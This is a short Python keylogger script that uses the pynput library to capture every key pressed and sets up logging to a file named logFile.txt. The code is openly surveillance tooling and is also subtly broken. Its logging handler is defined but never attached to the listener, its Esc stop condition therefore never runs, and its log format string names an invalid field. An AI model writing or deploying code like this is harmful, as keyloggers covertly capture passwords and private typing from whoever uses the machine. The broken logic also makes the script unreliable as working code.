#imported from required library pynput
from pynput import keyboard
from pynput.keyboard import Key, Listener
import logging

logFile = ""
logging.basicConfig(filename=(logFile + "logFile.txt"), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def keyStroke(key):
    logging.info(str(key))

    #condition for key logger to end
    if key == Key.esc:
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()